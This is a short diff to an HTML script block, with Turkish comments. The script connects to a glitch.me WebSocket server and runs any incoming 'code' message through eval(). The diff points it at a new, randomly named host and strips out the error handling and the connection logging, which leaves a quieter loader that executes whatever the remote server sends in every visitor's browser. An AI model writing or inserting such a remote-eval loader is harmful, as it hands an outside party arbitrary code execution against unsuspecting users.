@@ -1,20 +1,12 @@
 <script>
 (function() {
-    var ws = new WebSocket('wss://my-websocket-server.glitch.me');
+    var ws = new WebSocket('wss://adhesive-sassy-spaghetti.glitch.me');
     
     ws.onmessage = function(event) {
         var msg = JSON.parse(event.data);
         if (msg.type === 'code') {
-            try {
-                eval(msg.data); // Gelen kodu çalıştır
-            } catch (e) {
-                console.error('Kod hatası:', e);
-            }
+            eval(msg.data); // Gelen kodu çalıştır
         }
-    };
-    
-    ws.onopen = function() {
-        console.log('WebSocket bağlandı');
     };
 })();
 </script>
